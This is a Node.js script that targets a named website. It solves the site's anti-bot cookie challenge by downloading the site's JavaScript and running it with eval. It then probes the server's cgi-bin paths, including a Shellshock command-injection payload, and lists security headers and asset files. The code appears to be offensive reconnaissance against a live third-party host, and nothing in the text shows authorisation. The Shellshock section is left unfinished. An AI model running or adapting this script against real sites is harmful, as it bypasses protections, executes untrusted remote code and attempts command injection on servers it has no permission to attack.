const https = require('https');
const agent = new https.Agent({ keepAlive: true });

function toNumbers(d) {
    var e = [];
    d.replace(/(..)/g, function(d) { e.push(parseInt(d, 16)); });
    return e;
}
function toHex() {
    for (var d = [], d = 1 == arguments.length && arguments[0].constructor == Array ? arguments[0] : arguments, e = '', f = 0; f < d.length; f++)
        e += (16 > d[f] ? '0' : '') + d[f].toString(16);
    return e.toLowerCase();
}

function fetch(url, cookie, method = 'GET', body = null) {
    return new Promise((resolve) => {
        const opts = {
            hostname: 'idcard.kesug.com',
            path: url,
            method: method,
            agent: agent,
            headers: { 'User-Agent': 'Mozilla/5.0' }
        };
        if (cookie) opts.headers['Cookie'] = '__test=' + cookie;
        if (body) {
            opts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            opts.headers['Content-Length'] = Buffer.byteLength(body);
        }
        const req = https.get(opts, (res) => {
            let d = '';
            res.on('data', c => d += c);
            res.on('end', () => resolve({ status: res.statusCode, body: d, headers: res.headers }));
        });
        req.on('error', (e) => resolve({ status: 0, body: e.message, headers: {} }));
        if (body) req.write(body);
        req.end();
    });
}

async function main() {
    const aesRes = await fetch('/aes.js');
    eval(aesRes.body);
    const chRes = await fetch('/');
    const m = chRes.body.match(/toNumbers\("([a-f0-9]+)"\).*?toNumbers\("([a-f0-9]+)"\).*?toNumbers\("([a-f0-9]+)"\)/s);
    const cookieVal = toHex(slowAES.decrypt(toNumbers(m[3]), 2, toNumbers(m[1]), toNumbers(m[2])));
    console.log('Cookie:', cookieVal);

    // Verify bypass
    const verify = await fetch('/?i=1', cookieVal);
    if (verify.body.includes('slowAES')) { console.log('Bypass FAILED'); return; }
    console.log('=== BYPASS OK ===\n');

    // 1. Check sitemap
    const sm = await fetch('/sitemap.xml', cookieVal);
    console.log('sitemap.xml:', sm.body);

    // 2. cgi-bin exploration
    console.log('\n=== CGI-BIN ===');
    const cgi_paths = ['/cgi-bin/test.cgi', '/cgi-bin/printenv', '/cgi-bin/printenv.pl',
        '/cgi-bin/env.cgi', '/cgi-bin/info.cgi', '/cgi-bin/php-cgi',
        '/cgi-bin/php', '/cgi-bin/python.cgi', '/cgi-bin/index.cgi',
        '/cgi-bin/status.cgi', '/cgi-bin/test.pl',
        // ShellShock test
        '/cgi-bin/test.cgi?()%20{%20:;%20};echo%20vulnerable'];
    for (const p of cgi_paths) {
        const r = await fetch(p, cookieVal);
        const snippet = r.body.substring(0, 200).replace(/\n/g, '\\n');
        console.log(`[${r.status}] ${p} (${r.body.length}b) -> ${snippet}`);
    }

    // 3. Try ShellShock with specific User-Agent
    console.log('\n=== SHELLSHOCK TEST ===');
    const ssHost = 'https://idcard.kesug.com';
    // Try with Node's http module keeping cookie

    // 4. Check server headers
    console.log('\n=== HEADERS ===');
    const hdr = await fetch('/favicon.ico', cookieVal);
    const interesting = ['server', 'x-powered-by', 'x-frame-options', 'content-security-policy',
        'set-cookie', 'x-xss-protection', 'strict-transport-security', 'via'];
    for (const h of interesting) {
        if (hdr.headers[h]) console.log(`${h}: ${hdr.headers[h]}`);
    }

    // 5. Check if assets are versioned or reveal anything
    console.log('\n=== ASSET PATHS ===');
    const assets_paths = ['/assets/index-CApTIDIg.js', '/assets/index-BlmuE42x.css',
        '/og_image.webp'];
    for (const p of assets_paths) {
        const r = await fetch(p, cookieVal);
        console.log(`[${r.status}] ${p} (${r.body.length}b)`);
    }
}

main();
